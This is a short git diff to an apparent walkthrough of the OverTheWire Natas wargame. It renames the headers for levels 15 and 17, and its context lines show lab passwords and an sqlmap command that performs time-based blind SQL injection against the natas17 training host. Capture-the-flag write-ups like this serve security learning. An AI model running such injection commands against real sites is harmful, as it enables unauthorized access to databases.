@@ -189,7 +189,7 @@ SELECT * from users
 
 `Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
 
-### Level 15 -
+### Level 15 - SQL enumerqtion with `sqlmap`
 ```
 http://natas15.natas.labs.overthewire.org/ natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 ```
@@ -274,7 +274,7 @@ Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
 ```
 `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
 
-### Level 17
+### Level 17 - SQL enumeration 2
 ```bash
 $ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs
 available databases [2]:
